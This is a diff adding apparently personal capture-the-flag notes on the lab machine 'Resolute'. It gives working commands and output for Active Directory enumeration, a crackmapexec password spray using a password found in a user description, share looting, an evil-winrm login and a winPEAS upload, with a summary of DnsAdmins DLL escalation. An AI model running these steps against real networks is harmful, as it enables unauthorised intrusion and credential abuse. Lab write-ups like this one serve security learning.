@@ -1,0 +1,109 @@
+#########
+Password spray reveals that this password is still in use for another domain user account - OK
+which gives us access to the system over WinRM
+PowerShell transcript log is discovered, which has captured credentials passed on the command-line. 
+This is used to move laterally to a user that is a member of the DnsAdmins group.
+This group has the ability to specify that the DNS Server service loads a plugin DLL. 
+After restarting the DNS service, we achieve command execution on the domain controller in the context of `NT_AUTHORITY\SYSTEM`. 
+#########
+Resolute:
+
+1-Enumeration:
+    nmap -T5 -sV -sC -Pn 10.10.10.169  -oN enum/scan.log -vv
+    PORT     STATE    SERVICE        REASON      VERSION
+    88/tcp   open     kerberos-sec   syn-ack     Microsoft Windows Kerberos (server time: 2024-02-26 00:29:20Z)
+    135/tcp  open     msrpc          syn-ack     Microsoft Windows RPC
+    139/tcp  open     netbios-ssn    syn-ack     Microsoft Windows netbios-ssn
+    389/tcp  open     ldap           syn-ack     Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+    445/tcp  open     microsoft-ds   syn-ack     Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+    593/tcp  open     ncacn_http     syn-ack     Microsoft Windows RPC over HTTP 1.0
+    3268/tcp open     ldap           syn-ack     Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+
+
+
+    SMB - (Windows Server 2016 Standard 6.3) <------------- Check if Vuln
+
+    SMB/LDAP:
+    Enumerate LDAP:
+        nmap -n -Pn -sV --script "ldap* and not brute" -p 389 10.10.10.169
+
+        We find a bunch of potential users accounts
+
+
+      We will test Enumeration Via rpcclient:
+        rpcclient -U "support" 10.10.10.192      
+            rpcclient $> enumdomusers
+
+            rpcclient $> enumdomgroups
+                
+        We foud Users + Groups
+
+
+        We will enumerate LDAP because we founds info via RPC
+        enum4linux -a -u "" -p "" 10.10.10.169
+            [+] Password Info for Domain: MEGABANK
+
+            [+] Minimum password length: 7
+            [+] Password history length: 24
+            [+] Maximum password age: Not Set
+
+
+            index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
+
+            megabank.local\marko Welcome123!
+
+
+
+    Enumerate SMB:
+        $ crackmapexec smb 10.10.10.169 -u "" -p "" --shares
+            SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+            SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\: 
+            
+
+        PASSWORD SPRAY:
+            We will Passw Spray S"Welcome123!" found with enum4linux with all users via crackmapexec:
+                └─$ crackmapexec smb 10.10.10.169 -u users.txt  -p passwd.txt 
+                    SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
+
+            We found that melanie use the passwd too:
+                We can READ NETLOGON + SYSVOL files
+                    ─$ crackmapexec smb 10.10.10.169 -u melanie -d megabank.local -p Welcome123! --shares
+                        SMB         10.10.10.169    445    RESOLUTE         NETLOGON        READ            Logon server share
+                        SMB         10.10.10.169    445    RESOLUTE         SYSVOL          READ            Logon server share 
+
+
+                smbclient //10.10.10.169/NETLOGON -U'megabank.local\melanie'
+                    We Upload everything we can:
+                        smb: \> mask ""
+                        smb: \> recurse
+                        smb: \> prompt
+                        smb: \> mget *
+                    We found Nothing
+
+            We try access directly via Evil-WinRM - WE HAVE ACCESS:
+                evil-winrm -i 10.10.10.169 -u melanie  -p 'Welcome123!'
+                *Evil-WinRM* PS C:\Users\melanie\Documents> whoami
+                megabank\melanie
+                
+        Windows Privileges of melanie:
+            *Evil-WinRM* PS C:\Users\melanie\Desktop> whoami /priv
+                PRIVILEGES INFORMATION
+                ----------------------
+                Privilege Name                Description                    State
+                ============================= ============================== =======
+                SeMachineAccountPrivilege     Add workstations to domain     Enabled
+                SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+                SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+                
+        We are able to upoad some exe:
+            *Evil-WinRM* PS C:\users\melanie\Downloads> upload winPEASx64.exe
+
+    
+    Windows Melanie Account Ennumeration:
+        Nothing crazy via WinPEAS
+
+        We will user BloodHound:
+            
+
+
+
